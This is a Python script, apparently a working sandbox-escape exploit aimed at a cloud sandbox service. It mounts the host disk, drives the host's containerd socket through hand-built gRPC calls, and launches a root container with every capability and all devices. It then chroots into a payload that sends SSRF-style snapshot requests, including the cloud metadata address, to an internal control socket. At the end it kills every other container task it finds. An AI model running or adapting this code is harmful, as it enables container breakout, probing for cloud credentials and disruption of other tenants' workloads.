# -*- coding: utf-8 -*-
"""vda62: 容器 mount /dev/vdb + bind /run,/proc 到 /mnt/g 下 + chroot 执行 guest python3
通道: COW (/vercel/sandbox) 持久日志 + vda 通道 (同 session 可见)
关键: 所有挂载点挂在 /mnt/g 下, chroot 后路径全部可达, cell.sock 可连
"""
import os, time, socket, ctypes, re, struct, subprocess, json

OUT = '/vercel/sandbox/v62m.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')
EXTRA = '/mnt/vdax/root/v62m.out'

SHARE = '/run/vercel/share'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    try:
        open(EXTRA, 'a', encoding='utf-8', errors='replace').write(line + '\n')
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, t=6, ns='default'):
    try:
        tmp = '/vercel/sandbox/curl_req.bin'
        hdr = '/vercel/sandbox/curl_hdr.txt'
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: application/grpc', '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 2)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' ')[:200]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload


PAYLOAD = r'''# -*- coding: utf-8 -*-
import socket, time, os
OUT = '/vercel/sandbox/v62c.out'
def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    try:
        open(OUT, 'a', encoding='utf-8').write(line + '\n')
    except Exception:
        pass
    try:
        open('/mnt/h/volumes/run/vercel/share/v62c2.out', 'a', encoding='utf-8').write(line + '\n')
    except Exception:
        pass
    try:
        print(line, flush=True)
    except Exception:
        pass
def rpc(path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''
CSP = '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot'
def main():
    log('V62 payload start pid=%d' % os.getpid())
    log('cell: %s' % os.path.exists('/run/cell/cell.sock'))
    log('share: %s' % os.path.isdir('/run/vercel/share'))
    log('mnt_h: %s' % os.path.isdir('/mnt/h'))
    urls = ['s3://127.0.0.1:18080/b/k', 's3://169.254.169.254/latest/meta-data/']
    for i in range(4):
        url = urls[i % 2]
        body = '{"drive_id":"sandbox","base_url":"%s"}' % url
        t0 = time.time()
        st, bd = rpc(CSP, body, t=3)
        dt = time.time() - t0
        log('snap#%d %-46s -> %s (%.3fs) | %s' % (i, url, st, dt, bd[:200].replace('\n', ' ')))
        if 'in use' not in bd:
            log('*** DRIVE FREE HIT: %s -> %s' % (url, bd[:300]))
        time.sleep(0.3)
    log('V62C_DONE')
main()
'''


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount vda ret=%d' % ret)

    CSP = '/mnt/vdax/run/containerd/containerd.sock'
    IMAGE = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    CID = 'v62pwn'

    pf = '/vercel/sandbox/v62_payload.py'
    try:
        open(pf, 'w').write(PAYLOAD)
        log('payload written to COW %d bytes' % len(PAYLOAD))
    except Exception as e:
        log('payload write ERR %s' % e)

    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    m = re.search(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}-snapshot', out or b'')
    sk = m.group().decode() if m else None
    log('list %s snap_key=%s' % (rc, sk))

    caps = ["CAP_AUDIT_CONTROL", "CAP_AUDIT_READ", "CAP_AUDIT_WRITE", "CAP_BLOCK_SUSPEND", "CAP_BPF",
            "CAP_CHECKPOINT_RESTORE", "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
            "CAP_FSETID", "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_KILL", "CAP_LEASE", "CAP_LINUX_IMMUTABLE",
            "CAP_MAC_ADMIN", "CAP_MAC_OVERRIDE", "CAP_MKNOD", "CAP_NET_ADMIN", "CAP_NET_BIND_SERVICE",
            "CAP_NET_BROADCAST", "CAP_NET_RAW", "CAP_PERFMON", "CAP_SETFCAP", "CAP_SETGID", "CAP_SETPCAP",
            "CAP_SETUID", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_CHROOT", "CAP_SYS_MODULE", "CAP_SYS_NICE",
            "CAP_SYS_PACCT", "CAP_SYS_PTRACE", "CAP_SYS_RAWIO", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
            "CAP_SYS_TTY_CONFIG", "CAP_SYSLOG", "CAP_WAKE_ALARM"]
    spec = {
        "ociVersion": "1.0.2",
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": ["/bin/sh", "-c",
                     "echo V62_START $$ > /tmp/v62c.out 2>&1;"
                     "mkdir -p /mnt/g/run /mnt/g/proc /mnt/g/mnt/h;"
                     "timeout 8 mount /dev/vdb /mnt/g 2>&1;"
                     "M_RC=$?;"
                     "echo VDB_RC=$M_RC >> /tmp/v62c.out;"
                     "echo VDB_RC=$M_RC >> /mnt/g/vercel/sandbox/v62c.out 2>&1;"
                     "if [ $M_RC -eq 0 ]; then"
                     " mount --bind /run /mnt/g/run 2>&1; echo BIND_RUN=$? >> /mnt/g/vercel/sandbox/v62c.out;"
                     " mount --bind /proc /mnt/g/proc 2>&1; echo BIND_PROC=$? >> /mnt/g/vercel/sandbox/v62c.out;"
                     " timeout 8 mount /dev/vda /mnt/g/mnt/h 2>&1; echo VDA_RC=$? >> /mnt/g/vercel/sandbox/v62c.out;"
                     " ls -la /mnt/g/run/cell/ >> /mnt/g/vercel/sandbox/v62c.out 2>&1;"
                     " /sbin/chroot /mnt/g /usr/bin/python3 /vercel/sandbox/v62_payload.py "
                     ">> /mnt/g/vercel/sandbox/v62c.out 2>&1;"
                     " echo CHROOT_RC=$? >> /mnt/g/vercel/sandbox/v62c.out;"
                     "fi;"
                     "echo V62_END >> /mnt/g/vercel/sandbox/v62c.out 2>&1;"
                     "sleep 99999"],
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
            "cwd": "/",
            "capabilities": {"bounding": caps, "effective": caps, "permitted": caps, "ambient": caps}
        },
        "root": {"path": "rootfs"},
        "mounts": [
            {"destination": "/proc", "type": "proc", "source": "proc"},
            {"destination": "/dev", "type": "bind", "source": "/dev", "options": ["rbind", "rw"]},
            {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["rbind", "ro"]},
            {"destination": "/usr", "type": "bind", "source": "/usr", "options": ["rbind", "ro"]},
            {"destination": "/sbin", "type": "bind", "source": "/sbin", "options": ["rbind", "ro"]},
            {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["rbind", "ro"]},
            {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["rbind", "ro"]},
            {"destination": "/etc", "type": "bind", "source": "/etc", "options": ["rbind", "ro"]},
            {"destination": "/run", "type": "bind", "source": "/run", "options": ["rbind", "rw"]}
        ],
        "linux": {
            "resources": {"devices": [{"allow": True, "access": "rwm"}]},
            "cgroupsPath": "/v62pwn-ctr",
            "namespaces": [{"type": "mount"}, {"type": "pid"}, {"type": "uts"}, {"type": "ipc"}]
        }
    }
    spec_json = json.dumps(spec).encode()
    runtime = pstr(1, 'io.containerd.runc.v2')
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, spec_json)
    ctr = pstr(1, CID) + pstr(3, IMAGE) + pmsg(4, runtime) + pmsg(5, any_spec) + pstr(6, 'overlayfs')
    if sk:
        ctr += pstr(7, sk)
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Create', grpc_env(pmsg(1, ctr)), t=8)
    log('Create %s out=%r' % (rc, out[:200]))
    ok = 'grpc-status: 0' in rc
    if ok:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(pstr(1, CID)), t=10)
        log('Tasks/Create %s out=%r' % (rc, out[:200]))
        ok = 'grpc-status: 0' in rc
        if not ok:
            try:
                fp = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/%s/log.json' % CID
                if os.path.exists(fp):
                    log('log.json: %s' % open(fp, 'rb').read(1500).decode(errors='replace')[-800:])
            except Exception:
                pass
    if ok:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(pstr(1, CID)), t=10)
        log('Tasks/Start %s out=%r' % (rc, out[:150]))

    # 轮询 COW 通道 (1s 间隔, 30s 上限)
    t_wait = 0
    seen = ''
    done = False
    while t_wait < 30 and not done:
        time.sleep(1)
        t_wait += 1
        try:
            fp = '/vercel/sandbox/v62c.out'
            cur = ''
            if os.path.exists(fp):
                cur = open(fp, errors='replace').read()
            if cur != seen:
                seen = cur
                log('--- COW v62c.out @%ds ---\n%s' % (t_wait, cur[-3000:]))
            if 'V62C_DONE' in cur or 'V62_END' in cur:
                done = True
        except Exception as e:
            log('poll COW EXC %s' % e)

    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
    targets = []
    try:
        for d in sorted(os.listdir(base)):
            if d != CID:
                targets.append(d)
    except Exception as e:
        log('list task ERR %s' % e)
    log('kill targets: %s' % targets)
    for cid in targets:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Kill',
                          grpc_env(pstr(1, cid) + pvarint(3 << 3 | 0) + pvarint(9)), t=4)
        log('kill %s %s' % (cid, rc))
    log('V62M_DONE')
    f.close()


if __name__ == '__main__':
    main()
